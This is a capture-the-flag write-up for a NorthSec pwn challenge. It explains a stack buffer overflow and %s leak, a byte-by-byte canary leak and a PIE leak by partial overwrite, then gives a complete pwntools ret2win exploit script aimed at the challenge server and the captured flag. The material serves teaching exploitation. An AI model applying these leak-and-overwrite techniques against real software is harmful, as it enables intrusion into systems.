# 🧠 Childhood Game — Pwn Writeup

**Category:** Pwn
**Difficulty:** Medium → Hard
**CTF:** NorthSec CTF
**Architecture:** x86_64
**Protections:** PIE, Canary, NX, Full RELRO

---

## 📜 Description

> *"=== welcome to your childhood game ==="*
> A simple game where the program expects numbers… or `"boom"` every 5 rounds.
> But something feels off in how inputs are handled.

---

## 🔍 Initial Analysis

### 🧾 Binary Protections

```bash
checksec --file=chall
```

```
PIE:        Enabled
Canary:     Found
NX:         Enabled
RELRO:      Full
```

➡️ Classic hardened binary → no direct BOF → need leaks.

---

### 🔑 Interesting Strings

```bash
strings chall
```

```
You said: %s
Correct: %s
boom
cat flag.txt
```

➡️ Presence of `system("cat flag.txt")` → strong **ret2win candidate**

---

## 🧠 Vulnerability Analysis

Decompiled function:

```c
read(0, local_48, 0x50);
printf("You said: %s\n", local_48);
local_20 = local_48;
strcpy(local_20, local_28);
printf("Correct: %s\n", local_20);
```

---

## 🚨 Vulnerabilities

### 1. Buffer Overflow

```c
char local_48[15];
read(0, local_48, 0x50);
```

➡️ Reads **80 bytes into 15 bytes buffer**

---

### 2. Arbitrary Read via `%s`

```c
printf("You said: %s\n", local_48);
```

➡️ If no NULL byte → prints **stack memory → leak**

---

### 3. Controlled Pointer Copy

```c
local_20 = local_48;
strcpy(local_20, local_28);
```

➡️ If we overwrite stack:

* we control where `strcpy` writes
* but `local_28` **must stay valid** → or crash

---

## 🧩 Exploitation Strategy

### 🎯 Goal

Call:

```c
win() → system("cat flag.txt")
```

---

## ⚙️ Step 1 — Leak PIE

We overwrite **1 byte of a pointer** to redirect `"Correct:"` output:

```python
p.send(b'R'*0x20 + byte)
```

We brute-force until we get:

```
saved_rip = PIE + 0x1330
```

Then:

```python
pie_base = saved_rip - 0x1330
win  = pie_base + 0x11a9
boom = pie_base + 0x203f
main = pie_base + 0x1304
```

---

## 🧪 Step 2 — Leak Canary (Byte per Byte)

We reuse the same primitive:

```python
low = (ret_low - 0x0f + i) & 0xff
payload = b'A'*0x20 + bytes([low])
```

➡️ Each round leaks **1 byte**

⚠️ Must skip rounds where:

```c
if (round % 5 == 0) → local_28 = "boom"
```

---

## 🧱 Final Canary

```python
canary = b'\x00' + leaked_bytes
```

---

## 🧨 Step 3 — Final Exploit

### Stack Layout

```
rbp-0x40
+0x20 → local_28
+0x28 → local_20
+0x38 → canary
+0x40 → saved rbp
+0x48 → RIP
```

---

## 💣 Final Payload

```python
payload  = b'C' * 0x20
payload += p64(boom)      # keep valid pointer
payload += b'D' * 8
payload += b'E' * 8
payload += canary
payload += b'F' * 8
payload += p64(win + 1)   # 🔥 critical (stack alignment)
```

---

## ⚠️ Important Trick — `win + 1`

Direct jump to `win` crashes.

✔️ Fix:

```python
win + 1
```

➡️ Skips `push rbp` → fixes stack alignment for `system()`

---

## 🚀 Exploit Script (Final)

```python
from pwn import *

context.binary = ELF('./chall', checksec=False)
context.log_level = 'info'

HOST = '34.123.57.171'
PORT = 42064

p = remote(HOST, PORT)

def recv_prompt(n):
    p.recvuntil(f'[{n}] > '.encode())

def play(payload, round_no):
    p.send(payload)
    data = p.recvuntil(f'[{round_no+1}] > '.encode())
    line = data.split(b'Correct: ',1)[1].split(b'\n',1)[0]
    return line

round_no = 1
recv_prompt(1)

# ===== Leak PIE =====
ret_low = None
for cand in range(0x08, 0x100, 0x10):
    line = play(b'R'*0x20 + bytes([cand]), round_no)
    round_no += 1

    if len(line) < 6:
        continue

    addr = u64(line[:6].ljust(8, b'\x00'))
    base = addr - 0x1330

    if (base & 0xfff) == 0:
        ret_low = cand
        saved_rip = addr
        pie_base = base
        break

win  = pie_base + 0x11a9
boom = pie_base + 0x203f

# ===== Leak Canary =====
while round_no % 5 == 0:
    play(b'x\n', round_no)
    round_no += 1

tail = b''
for i in range(7):
    while round_no % 5 == 0:
        play(b'x\n', round_no)
        round_no += 1

    low = (ret_low - 0x0f + i) & 0xff
    line = play(b'A'*0x20 + bytes([low]), round_no)
    round_no += 1

    tail += line[:1] if line else b'\x00'

canary = b'\x00' + tail

# ===== Skip to final round =====
while round_no < 30:
    play(b'x\n', round_no)
    round_no += 1

# ===== Final payload =====
payload  = b'C' * 0x20
payload += p64(boom)
payload += b'D'*8
payload += b'E'*8
payload += canary
payload += b'F'*8
payload += p64(win + 1)

p.send(payload)
p.interactive()
```

---

## 🏁 Flag

```
NSC{6dad7ad581ee1f55ad65e3a653c14217}
```

---

## 🧠 Key Takeaways

* Partial overwrite → extremely powerful primitive
* `%s` leaks = gold in CTF
* Canary bypass via byte leaks
* PIE bypass via return address
* ⚠️ Stack alignment is critical in x64 exploitation

---

## 🏆 Conclusion

This challenge demonstrates a **full modern exploit chain**:

✔ Leak
✔ Canary bypass
✔ PIE bypass
✔ Controlled write
✔ ret2win with alignment fix

🔥 Solid real-world pwn scenario.

---
